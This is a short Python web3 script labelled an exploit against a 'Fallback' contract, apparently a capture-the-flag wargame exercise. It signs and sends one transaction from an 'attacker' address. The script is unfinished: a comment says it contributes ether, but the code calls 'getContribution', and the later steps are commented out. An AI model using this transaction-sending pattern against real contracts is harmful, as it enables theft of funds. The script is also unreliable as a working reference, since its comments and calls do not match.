from dotenv import load_dotenv, find_dotenv
import os
from web3 import Web3


load_dotenv(find_dotenv())

RPC_ENDPOINT = os.environ.get("RPC_ENDPOINT")
PRIVATE_KEY = os.environ.get("PRIVATE_KEY")
ATTACKER_ADDRESS = os.environ.get("ATTACKER_ADDRESS")
CONTRACT_ADDRESS = os.environ.get("CONTRACT_ADDRESS")


def run_exploit(w3):
    """Run exploit."""
    # Create contract instance
    with open("./Fallback.abi", "r") as file:
        abi = file.read()
    Fallback = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)

    nonce = w3.eth.get_transaction_count(ATTACKER_ADDRESS)
    
    # Contribute ether via contract's 'contribute' function
    fallback_get_contribution_tx = Fallback.functions.getContribution().buildTransaction({
        'gas': 2000000,
        'gasPrice': w3.toWei('2.05', 'gwei'),
        'nonce': nonce,
     })

    signed_fallback_get_contribution_tx = w3.eth.account.sign_transaction(fallback_get_contribution_tx, private_key=PRIVATE_KEY)

    print(signed_fallback_get_contribution_tx)
    
    tx_hash = w3.eth.send_raw_transaction(signed_fallback_get_contribution_tx.rawTransaction)

    print(tx_hash)

    # w3.eth.account.sign_transaction
    # w3.eth.send_raw_transaction

    # Confirm contribution via contract's 'getContribution' function
    # contribution = Fallback.functions.getContribution().call()
    # print(contribution)


    # print(w3.eth.get_block('latest'))


def main():
    """Connect web3 and run exploit."""
    w3 = Web3(Web3.HTTPProvider(RPC_ENDPOINT))

    if w3.isConnected():
        run_exploit(w3)


if __name__ == "__main__":
    main()
